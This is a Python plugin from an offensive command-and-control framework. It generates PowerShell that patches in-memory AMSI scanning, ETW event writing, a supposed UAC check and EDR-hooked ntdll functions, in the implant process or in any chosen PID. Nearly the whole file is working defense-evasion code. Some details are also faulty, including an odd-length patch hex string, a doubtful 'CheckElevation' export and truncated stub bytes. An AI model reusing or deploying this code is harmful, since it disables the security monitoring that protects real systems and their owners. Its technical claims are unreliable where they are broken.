"""
privilege_escalation/memory_patcher — In-process memory patching via ctx dispatch.
MITRE T1562.001 / T1562.006.
Patches security-relevant functions in the agent process (AMSI, ETW, UAC check,
EDR hooks) and optionally a remote PID. Supersedes the former ctypes-on-operator
implementation — all Win32 calls now execute on the implant host via ctx.ps().
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class MemoryPatcher(BasePlugin):
    NAME        = "memory_patcher"
    DESCRIPTION = "Patch AMSI/ETW/UAC/EDR hooks in the agent process or a remote PID (T1562.001)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1562.001"
    CATEGORY    = "defense_evasion"
    VERSION     = "2.0.0"

    schema = ParamSchema().add(
        Param("patch_type", str, required=False, default="all",
              help="all | amsi | etw | uac | edr | custom"),
        Param("target_pid", int, required=False, default=0,
              help="PID to patch (0 = current PowerShell / agent process)"),
        Param("custom_module", str, required=False, default="",
              help="[custom] Module name, e.g. amsi.dll"),
        Param("custom_function", str, required=False, default="",
              help="[custom] Export to patch"),
        Param("custom_patch_hex", str, required=False, default="C3",
              help="[custom] Patch bytes as hex string (default: C3 = ret)"),
        Param("timeout", int, required=False, default=30),
    )

    # (module, function, patch_hex, label)
    _PATCHES = {
        "amsi": [
            ("amsi.dll",   "AmsiScanBuffer",   "31C0C3",       "AmsiScanBuffer→xor eax,eax;ret"),
            ("amsi.dll",   "AmsiInitialize",   "B8000000080C3","AmsiInitialize→fail"),
            ("amsi.dll",   "AmsiScanString",   "B800000008C3", "AmsiScanString→fail"),
            ("amsi.dll",   "AmsiOpenSession",  "C3",           "AmsiOpenSession→ret"),
        ],
        "etw": [
            ("ntdll.dll",  "EtwEventWrite",    "C3",           "EtwEventWrite→ret"),
            ("ntdll.dll",  "EtwEventWriteEx",  "C3",           "EtwEventWriteEx→ret"),
            ("ntdll.dll",  "EtwEventWriteFull","C3",           "EtwEventWriteFull→ret"),
        ],
        "uac": [
            # UAC check in kernel32 — makes IsUserAnAdmin always return 1
            ("kernel32.dll","CheckElevation",  "B801000000C3", "CheckElevation→1"),
        ],
        "edr": [
            # Restore clean stubs (NOP-fill; actual ntdll unhooking is in unhook.c implant module)
            ("ntdll.dll",  "NtCreateThreadEx",         "4C8BD1B8",  "NtCreateThreadEx→mov r10,rcx;mov eax"),
            ("ntdll.dll",  "NtAllocateVirtualMemory",  "4C8BD1B8",  "NtAllocateVirtualMemory→mov r10,rcx;mov eax"),
        ],
    }

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        patch_type  = params.get("patch_type", "all").lower()
        target_pid  = int(params.get("target_pid", 0))
        timeout     = int(params.get("timeout", 30))

        if patch_type == "custom":
            mod  = params.get("custom_module", "")
            func = params.get("custom_function", "")
            hex_ = params.get("custom_patch_hex", "C3")
            if not mod or not func:
                return ModuleResult.err("custom mode requires custom_module and custom_function")
            patches = [(mod, func, hex_, f"{func}→custom")]
        elif patch_type == "all":
            patches = [p for cat in self._PATCHES.values() for p in cat]
        elif patch_type in self._PATCHES:
            patches = self._PATCHES[patch_type]
        else:
            return ModuleResult.err(f"Unknown patch_type '{patch_type}'. Use: all|amsi|etw|uac|edr|custom")

        ps = self._build_ps(patches, target_pid)
        r  = ctx.ps(ps, timeout=timeout)
        if r["status"] != "ok":
            return ModuleResult.err(f"memory_patcher failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="memory_patcher")

    @staticmethod
    def _build_ps(patches: list, target_pid: int) -> str:
        open_proc = (
            "$hProc = [IntPtr](-1)"
            if target_pid == 0 else
            f"$hProc = [MP]::OpenProcess(0x1F0FFF, $false, {target_pid}); if ($hProc -eq [IntPtr]::Zero) {{ Write-Output '[-] OpenProcess failed'; exit }}"
        )

        patch_lines = []
        for mod, func, hex_patch, label in patches:
            patch_lines.append(
                f"  Apply-Patch '{mod}' '{func}' ([byte[]]([Convert]::FromHexString('{hex_patch}'))) '{label}'"
            )
        patch_block = "\n".join(patch_lines)

        return f"""
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class MP {{
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandleA(string n);
    [DllImport("kernel32.dll")] public static extern IntPtr LoadLibraryA(string n);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string fn);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint da, bool inh, int pid);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr ph, IntPtr a, UIntPtr s, uint np, out uint op);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr ph, IntPtr a, byte[] b, UIntPtr s, out UIntPtr w);
    [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr ph, IntPtr a, byte[] b, UIntPtr s, out UIntPtr r);
}}
'@
$results = @("[*] Memory patcher running")
{open_proc}

function Apply-Patch($mod, $func, [byte[]]$bytes, $label) {{
    $hMod = [MP]::GetModuleHandleA($mod)
    if ($hMod -eq [IntPtr]::Zero) {{
        $hMod = [MP]::LoadLibraryA($mod)
        if ($hMod -eq [IntPtr]::Zero) {{ $script:results += "  [-] $label — module $mod not loaded"; return }}
    }}
    $addr = [MP]::GetProcAddress($hMod, $func)
    if ($addr -eq [IntPtr]::Zero) {{ $script:results += "  [-] $label — function $func not found"; return }}

    # Read current bytes for before/after
    $before = New-Object byte[] $bytes.Length
    $rd = [UIntPtr]::Zero
    [MP]::ReadProcessMemory($hProc, $addr, $before, [UIntPtr]$bytes.Length, [ref]$rd) | Out-Null
    $beforeHex = ($before | ForEach-Object {{ $_.ToString('X2') }}) -join ''

    $old = [uint]0
    [MP]::VirtualProtectEx($hProc, $addr, [UIntPtr]$bytes.Length, 0x40, [ref]$old) | Out-Null
    $wr = [UIntPtr]::Zero
    $ok = [MP]::WriteProcessMemory($hProc, $addr, $bytes, [UIntPtr]$bytes.Length, [ref]$wr)
    [MP]::VirtualProtectEx($hProc, $addr, [UIntPtr]$bytes.Length, $old, [ref]([uint]0)) | Out-Null

    $patchHex = ($bytes | ForEach-Object {{ $_.ToString('X2') }}) -join ''
    if ($ok -and $wr.ToUInt64() -eq [uint]$bytes.Length) {{
        $script:results += "  [+] $label  0x$($addr.ToString('X'))  $beforeHex→$patchHex"
    }} else {{
        $script:results += "  [-] $label  WriteProcessMemory failed (wr=$wr)"
    }}
}}

{patch_block}
$results -join "`n"
""".strip()
